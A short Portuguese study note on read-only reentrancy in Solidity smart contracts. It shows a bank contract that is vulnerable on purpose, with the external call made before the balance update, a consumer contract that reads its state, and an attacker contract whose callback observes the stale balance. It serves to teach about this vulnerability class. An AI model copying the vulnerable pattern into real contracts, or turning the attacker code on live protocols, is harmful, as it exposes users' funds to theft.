+++
title = "Reentrada de Somente-Leitura (Solidity)"
author = ["Gabriel Rosa"]
date = 2023-09-12
tags = ["reentrancy"]
draft = false
+++

tags
: [Reentrada (SWC-107)]({{< relref "reentrada_swc_107.md" >}})

source
: [Read-Only Reentrancy (SCSFG)](https://scsfg.io/hackers/reentrancy/#read-only-reentrancy)

É um tipo específico de reentrada entre contratos que acontece quando o comportamento de um contrato inteligente depende do estado de outro contrato e essa informação fica desatualizada para o contrato que a utiliza.


## Vulnerabilidade {#vulnerabilidade}

```solidity
contract Bank is ReentrancyGuard {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public nonReentrant {
        uint256 amount = balances[msg.sender];
        (bool success, ) = payable(msg.sender).call{value: amount}("");
        require(success);
        balances[msg.sender] = 0;
    }
}

contract BankConsumer {
    Bank private bank;

    constructor(address _bank) {
        bank = Bank(_bank);
    }

    function getBalance(address account) public view returns (uint256) {
        return bank.balances(account);
    }
}
```


## Exploitando {#exploitando}

```solidity
contract Attacker {
    event Checkpoint(uint256 balance);

    Bank public bank;
    BankConsumer public consumer;

    constructor(address _bankAddress, address _consumerAddress) {
        bank = Bank(_bankAddress);
        consumer = BankConsumer(_consumerAddress);
    }

    function attack() public {
        emit Checkpoint(consumer.getBalance(address(this))); // 1 - 0 ether
        bank.deposit{value: 1 ether}();
        bank.withdraw();
        emit Checkpoint(consumer.getBalance(address(this))); // 3 - 0 ether
    }

    receive() external payable {
        emit Checkpoint(consumer.getBalance(address(this))); // 2 - 1 ether
    }
}
```
